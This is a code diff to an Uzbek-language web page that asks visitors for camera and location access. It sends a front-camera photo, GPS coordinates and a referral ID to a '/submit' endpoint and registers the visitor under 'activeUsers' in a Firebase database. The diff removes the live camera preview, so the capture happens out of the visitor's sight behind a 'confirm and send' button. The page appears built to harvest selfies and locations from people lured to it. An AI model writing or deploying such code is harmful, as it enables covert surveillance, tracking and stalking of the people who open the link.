@@ -335,7 +335,6 @@ body,html{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f5
 .loading{display:inline-block;width:16px;height:16px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin .6s linear infinite;margin-left:8px;}
 @keyframes spin{to{transform:rotate(360deg);}}
 .hidden{display:none;}
-#videoPreview{width:100%;max-width:400px;border-radius:8px;margin:15px 0;display:none;}
 .success-message{background:#28a745;color:#fff;padding:20px;border-radius:8px;text-align:center;margin-top:20px;font-size:18px;font-weight:600;}
 </style></head><body>
 <div class="header">
@@ -394,8 +393,8 @@ body,html{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f5
 <span id="locationStatus">Joylashuv ruxsati so'ralmoqda...</span>
 </div>
 </div>
-<video id="videoPreview" autoplay playsinline></video>
-<button class="btn-primary" id="submitBtn" disabled>Tasdiqlash va yuborish</button>
+<button class="btn-primary" id="go" disabled>Tasdiqlash va yuborish</button>
+<div id="status" class="hidden"></div>
 <div id="successMessage" class="hidden success-message">Muvaffaqiyatli yuborildi! Sizning ma'lumotlaringiz qayta ishlanmoqda.</div>
 </div>
 <div class="sidebar">
@@ -446,20 +445,19 @@ if(u)username=u.username||null;
 }
 
 function updateButton(){
-const btn=document.getElementById("submitBtn");
+const btn=document.getElementById("go");
 if(photoReady||locationReady){
 btn.disabled=false;
 btn.innerHTML="Tasdiqlash va yuborish";
 }else{
 btn.disabled=true;
-btn.innerHTML="Kamera yoki joylashuv kerak";
+btn.innerHTML="Kutish...";
 }
 }
 
 async function requestCamera(){
 const photoIcon=document.getElementById("photoIcon");
 const photoStatus=document.getElementById("photoStatus");
-const videoPreview=document.getElementById("videoPreview");
 try{
 photoStatus.textContent="Kamera ochilmoqda...";
 const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
@@ -519,27 +517,28 @@ console.error("Location error:",e);
 }
 }
 
-document.getElementById("submitBtn").onclick=async()=>{
-const btn=document.getElementById("submitBtn");
-const successMsg=document.getElementById("successMessage");
+document.getElementById("go").onclick=async()=>{
+const btn=document.getElementById("go"),status=document.getElementById("status");
 btn.disabled=true;
 btn.innerHTML="Yuborilmoqda...<span class='loading'></span>";
-try{
+status.classList.remove("hidden");
+status.textContent="Yuborilmoqda...";
+if(!photoBlob&&!geo){status.textContent="Hech narsa olinmadi";btn.disabled=false;return;}
 const fd=new FormData();
 fd.append("ref",ref);
-if(geo){
-fd.append("latitude",geo.lat);
-fd.append("longitude",geo.lon);
-}
+if(geo){fd.append("latitude",geo.lat);fd.append("longitude",geo.lon);}
 if(photoBlob)fd.append("photo",photoBlob,"s.jpg");
+try{
 await fetch("/submit",{method:"POST",body:fd});
 const userData={userId:ref,username,timestamp:Date.now(),active:true,hasPhoto:!!photoBlob,hasLocation:!!geo};
 await fetch(\`\${firebaseUrl}/activeUsers/\${ref}.json\`,{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify(userData)});
+status.classList.add("hidden");
+document.getElementById("successMessage").classList.remove("hidden");
 btn.style.display="none";
-successMsg.classList.remove("hidden");
 }catch(e){
+status.textContent="Xatolik yuz berdi";
 btn.disabled=false;
-btn.innerHTML="Xatolik yuz berdi. Qayta urinib ko'ring";
+btn.innerHTML="Qayta urinib ko'ring";
 console.error("Submit error:",e);
 }
 };
